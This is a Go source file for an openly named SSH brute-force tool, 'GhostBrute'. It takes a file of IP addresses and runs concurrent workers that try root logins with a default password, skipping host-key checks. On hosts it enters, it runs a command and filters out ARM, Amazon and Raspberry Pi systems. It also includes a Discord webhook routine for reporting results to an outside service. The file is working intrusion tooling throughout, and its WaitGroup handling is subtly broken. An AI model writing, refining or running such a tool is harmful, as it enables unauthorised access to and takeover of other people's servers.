package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// Configuration - Discord webhook URL should be loaded from env or config
var discordWebhookURL string

func init() {
	// Load from environment variable for security
	discordWebhookURL = os.Getenv("DISCORD_WEBHOOK_URL")
	if discordWebhookURL == "" {
		log.Println("[!] Warning: DISCORD_WEBHOOK_URL not set in environment")
	}
}

func checkThreads(routines int, thread int64) bool {
	return int64(routines) <= thread
}

var (
	ipfile  string
	threads string
	port    string
)

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	return !os.IsNotExist(err) && !info.IsDir()
}

func initFlags() {
	if len(os.Args) <= 3 {
		fmt.Println("Usage: ghostbrute <port> <threads> <iplist>")
		fmt.Println("  port:    SSH port number (default: 22)")
		fmt.Println("  threads: Number of concurrent workers (default: 5)")
		fmt.Println("  iplist:  File containing IP addresses (one per line)")
		os.Exit(1)
	}
	port = os.Args[1]
	threads = os.Args[2]
	ipfile = os.Args[3]
	
	// Validate input
	if _, err := strconv.Atoi(port); err != nil {
		log.Fatalf("Invalid port: %s", port)
	}
	if _, err := strconv.Atoi(threads); err != nil {
		log.Fatalf("Invalid thread count: %s", threads)
	}
	if !fileExists(ipfile) {
		log.Fatalf("IP list file not found: %s", ipfile)
	}
}

func waitTimeout(wg *sync.WaitGroup, timeout time.Duration) bool {
	c := make(chan struct{})
	go func() {
		defer close(c)
		wg.Wait()
	}()
	select {
	case <-c:
		return false
	case <-time.After(timeout):
		return true
	}
}

func isExcludedSystem(unameOutput string) bool {
	excludedSystems := []string{"aarch", "amzn", "amzn2", "armv7l", "raspberry", "raspberrypi"}
	for _, excluded := range excludedSystems {
		if strings.Contains(unameOutput, excluded) {
			return true
		}
	}
	return false
}

type DiscordMessage struct {
	Embeds []Embed `json:"embeds"`
}

type Embed struct {
	Title       string `json:"title,omitempty"`
	Description string `json:"description,omitempty"`
	Color       int    `json:"color,omitempty"`
	Author      Author `json:"author,omitempty"`
	Footer      Footer `json:"footer,omitempty"`
}

type Author struct {
	Name string `json:"name,omitempty"`
}

type Footer struct {
	Text string `json:"text,omitempty"`
}

func toDiscord(message DiscordMessage) {
	if discordWebhookURL == "" {
		log.Println("[*] Discord webhook not configured, skipping notification")
		return
	}
	
	payload, err := json.Marshal(message)
	if err != nil {
		log.Printf("[!] Failed to marshal Discord message: %v", err)
		return
	}
	
	resp, err := http.Post(discordWebhookURL, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		log.Printf("[!] Failed to send Discord notification: %v", err)
		return
	}
	defer resp.Body.Close()
	
	// Read and discard response body
	io.ReadAll(resp.Body)
	
	if resp.StatusCode >= 400 {
		log.Printf("[!] Discord API error: HTTP %d", resp.StatusCode)
	}
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func remoteRun(user string, addr string, pass string, cmd string, wg *sync.WaitGroup) (string, error) {
	defer wg.Done()

	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout: 40 * time.Second,
	}

	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
	if err != nil {
		return "", err
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer session.Close()

	var b bytes.Buffer
	session.Stdout = &b

	err = session.Run(cmd)
	if err != nil {
		return "", err
	}

	if isExcludedSystem(b.String()) {
		log.Printf("IP %s excluded due to system: %s", addr, b.String())
		return "", nil
	}

	return b.String(), nil
}

// Worker function that runs SSH commands in a controlled manner.
func worker(id int, jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for ip := range jobs {
		output, err := remoteRun("root", ip, "password", "uname -a", wg)
		if err == nil {
			fmt.Printf("Worker %d: Success for IP %s: %s\n", id, ip, output)
		} else {
			fmt.Printf("Worker %d: Error for IP %s: %s\n", id, ip, err)
		}
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Println("[*] GhostBrute v1.6.0+ - SSH Brute Force Tool")
	
	initFlags()
	
	log.Printf("[*] Configuration: port=%s threads=%s ipfile=%s", port, threads, ipfile)
	
	lines, err := readLines(ipfile)
	if err != nil {
		log.Fatalf("Failed to read IP list: %s", err)
	}
	
	log.Printf("[*] Loaded %d lines from IP list", len(lines))
	
	// Deduplicate IPs
	uniqueIPs := make(map[string]bool)
	for _, line := range lines {
		ip := strings.TrimSpace(line)
		if ip != "" && !strings.HasPrefix(ip, "#") { // Skip comments
			uniqueIPs[ip] = true
		}
	}
	
	var ips []string
	for ip := range uniqueIPs {
		ips = append(ips, ip)
	}
	
	log.Printf("[*] %d unique IPs to process", len(ips))
	
	numWorkers, _ := strconv.Atoi(threads)
	if numWorkers < 1 {
		numWorkers = 5
	}
	
	var wg sync.WaitGroup
	jobs := make(chan string, len(ips))
	
	log.Printf("[*] Launching %d worker goroutines", numWorkers)
	
	// Launch workers
	for w := 1; w <= numWorkers; w++ {
		wg.Add(1)
		go worker(w, jobs, &wg)
	}
	
	// Send the IPs to the workers
	go func() {
		for _, ip := range ips {
			jobs <- ip
		}
		close(jobs)
	}()
	
	// Wait for completion with timeout
	timeout := 120 * time.Second
	completed := make(chan struct{})
	go func() {
		wg.Wait()
		close(completed)
	}()
	
	select {
	case <-completed:
		log.Println("[+] All workers completed successfully")
	case <-time.After(timeout):
		log.Printf("[!] Execution timeout after %s", timeout)
	}
	
	log.Println("[*] GhostBrute execution finished")
}
